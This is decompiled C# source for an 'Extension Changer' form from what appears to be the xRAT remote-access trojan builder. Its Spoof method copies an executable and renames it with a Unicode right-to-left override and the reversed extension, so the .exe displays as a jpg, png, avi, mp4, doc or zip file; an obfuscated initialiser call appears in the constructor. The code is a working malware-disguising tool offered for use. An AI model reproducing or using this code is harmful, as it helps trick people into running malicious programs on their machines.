namespace xRAT
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class Form2 : Form
    {
        [AccessedThroughProperty("Button1")]
        private Button _Button1;
        [AccessedThroughProperty("ComboBox1")]
        private ComboBox _ComboBox1;
        [AccessedThroughProperty("PictureBox1")]
        private PictureBox _PictureBox1;
        [AccessedThroughProperty("PictureBox2")]
        private PictureBox _PictureBox2;
        [AccessedThroughProperty("PictureBox3")]
        private PictureBox _PictureBox3;
        [AccessedThroughProperty("ProgressBar1")]
        private ProgressBar _ProgressBar1;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        private IContainer icontainer_0;
        [AccessedThroughProperty("Timer1")]
        private Timer timer_0;

        public Form2()
        {
            Class1.QaIGh5M7cuigS();
            base.Load += new EventHandler(this.Form2_Load);
            this.InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            try
            {
                this.Spoof(this.TextBox1.Text, this.ComboBox1.Text);
                this.ProgressBar1.Value = Conversions.ToInteger("100");
                MessageBox.Show("Extension has changed !", "Extension Changer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
            }
            catch (Exception exception1)
            {
                ProjectData.SetProjectError(exception1);
                ProjectData.ClearProjectError();
            }
        }

        private void ComboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (this.ComboBox1.Text == "avi")
            {
                this.PictureBox1.Show();
                this.PictureBox2.Hide();
                this.PictureBox3.Hide();
            }
            if (this.ComboBox1.Text == "mp4")
            {
                this.PictureBox1.Show();
                this.PictureBox2.Hide();
                this.PictureBox3.Hide();
            }
            if (this.ComboBox1.Text == "zip")
            {
                this.PictureBox1.Hide();
                this.PictureBox2.Show();
                this.PictureBox3.Hide();
            }
            if (this.ComboBox1.Text == "doc")
            {
                this.PictureBox1.Hide();
                this.PictureBox2.Show();
                this.PictureBox3.Hide();
            }
            if (this.ComboBox1.Text == "png")
            {
                this.PictureBox1.Hide();
                this.PictureBox2.Hide();
                this.PictureBox3.Show();
            }
            if (this.ComboBox1.Text == "jpg")
            {
                this.PictureBox1.Hide();
                this.PictureBox2.Hide();
                this.PictureBox3.Show();
            }
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            this.Timer1.Start();
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            this.icontainer_0 = new System.ComponentModel.Container();
            ComponentResourceManager manager = new ComponentResourceManager(typeof(Form2));
            this.TextBox1 = new TextBox();
            this.ComboBox1 = new ComboBox();
            this.Button1 = new Button();
            this.ProgressBar1 = new ProgressBar();
            this.Timer1 = new Timer(this.icontainer_0);
            this.PictureBox3 = new PictureBox();
            this.PictureBox2 = new PictureBox();
            this.PictureBox1 = new PictureBox();
            ((ISupportInitialize) this.PictureBox3).BeginInit();
            ((ISupportInitialize) this.PictureBox2).BeginInit();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            this.SuspendLayout();
            Point point = new Point(12, 7);
            this.TextBox1.Location = point;
            this.TextBox1.Name = "TextBox1";
            Size size = new Size(0x145, 0x15);
            this.TextBox1.Size = size;
            this.TextBox1.TabIndex = 0;
            this.TextBox1.Text = @"C:\file.exe";
            this.ComboBox1.FormattingEnabled = true;
            this.ComboBox1.Items.AddRange(new object[] { "jpg", "png", "avi", "mp4", "doc", "zip" });
            point = new Point(0xea, 0x25);
            this.ComboBox1.Location = point;
            this.ComboBox1.Name = "ComboBox1";
            size = new Size(0x68, 0x15);
            this.ComboBox1.Size = size;
            this.ComboBox1.TabIndex = 2;
            this.ComboBox1.Text = "jpg";
            point = new Point(13, 0x41);
            this.Button1.Location = point;
            this.Button1.Name = "Button1";
            size = new Size(0x145, 0x2c);
            this.Button1.Size = size;
            this.Button1.TabIndex = 3;
            this.Button1.Text = ":: Changer Extension ::";
            this.Button1.UseVisualStyleBackColor = true;
            point = new Point(13, 0x24);
            this.ProgressBar1.Location = point;
            this.ProgressBar1.Name = "ProgressBar1";
            size = new Size(0xb9, 0x17);
            this.ProgressBar1.Size = size;
            this.ProgressBar1.TabIndex = 1;
            this.PictureBox3.BackColor = Color.Transparent;
            this.PictureBox3.Image = Class5.smethod_69();
            point = new Point(0xcc, 0x21);
            this.PictureBox3.Location = point;
            this.PictureBox3.Name = "PictureBox3";
            size = new Size(0x18, 0x1b);
            this.PictureBox3.Size = size;
            this.PictureBox3.TabIndex = 6;
            this.PictureBox3.TabStop = false;
            this.PictureBox2.BackColor = Color.Transparent;
            this.PictureBox2.Image = (Image) manager.GetObject("PictureBox2.Image");
            point = new Point(0xcc, 0x24);
            this.PictureBox2.Location = point;
            this.PictureBox2.Name = "PictureBox2";
            size = new Size(0x18, 0x19);
            this.PictureBox2.Size = size;
            this.PictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
            this.PictureBox2.TabIndex = 5;
            this.PictureBox2.TabStop = false;
            this.PictureBox1.Image = Class5.smethod_94();
            point = new Point(0xcc, 0x23);
            this.PictureBox1.Location = point;
            this.PictureBox1.Name = "PictureBox1";
            size = new Size(0x18, 0x18);
            this.PictureBox1.Size = size;
            this.PictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
            this.PictureBox1.TabIndex = 4;
            this.PictureBox1.TabStop = false;
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            size = new Size(350, 0x79);
            this.ClientSize = size;
            this.Controls.Add(this.PictureBox3);
            this.Controls.Add(this.PictureBox2);
            this.Controls.Add(this.PictureBox1);
            this.Controls.Add(this.Button1);
            this.Controls.Add(this.ComboBox1);
            this.Controls.Add(this.ProgressBar1);
            this.Controls.Add(this.TextBox1);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.Name = "Form2";
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = "Extension Changer";
            ((ISupportInitialize) this.PictureBox3).EndInit();
            ((ISupportInitialize) this.PictureBox2).EndInit();
            ((ISupportInitialize) this.PictureBox1).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        public void Spoof(string file, string extension)
        {
            byte[] bytes = File.ReadAllBytes(file);
            File.WriteAllBytes(Application.StartupPath + "‮" + Strings.StrReverse(extension) + ".exe", bytes);
        }

        private void Timer1_Tick(object sender, EventArgs e)
        {
        }

        internal virtual Button Button1
        {
            get
            {
                return this._Button1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button1_Click);
                if (this._Button1 != null)
                {
                    this._Button1.Click -= handler;
                }
                this._Button1 = value;
                if (this._Button1 != null)
                {
                    this._Button1.Click += handler;
                }
            }
        }

        internal virtual ComboBox ComboBox1
        {
            get
            {
                return this._ComboBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.ComboBox1_SelectedIndexChanged);
                if (this._ComboBox1 != null)
                {
                    this._ComboBox1.SelectedIndexChanged -= handler;
                }
                this._ComboBox1 = value;
                if (this._ComboBox1 != null)
                {
                    this._ComboBox1.SelectedIndexChanged += handler;
                }
            }
        }

        internal virtual PictureBox PictureBox1
        {
            get
            {
                return this._PictureBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox1 = value;
            }
        }

        internal virtual PictureBox PictureBox2
        {
            get
            {
                return this._PictureBox2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox2 = value;
            }
        }

        internal virtual PictureBox PictureBox3
        {
            get
            {
                return this._PictureBox3;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox3 = value;
            }
        }

        internal virtual ProgressBar ProgressBar1
        {
            get
            {
                return this._ProgressBar1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._ProgressBar1 = value;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return this._TextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox1 = value;
            }
        }

        internal virtual Timer Timer1
        {
            get
            {
                return this.timer_0;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Timer1_Tick);
                if (this.timer_0 != null)
                {
                    this.timer_0.Tick -= handler;
                }
                this.timer_0 = value;
                if (this.timer_0 != null)
                {
                    this.timer_0.Tick += handler;
                }
            }
        }
    }
}

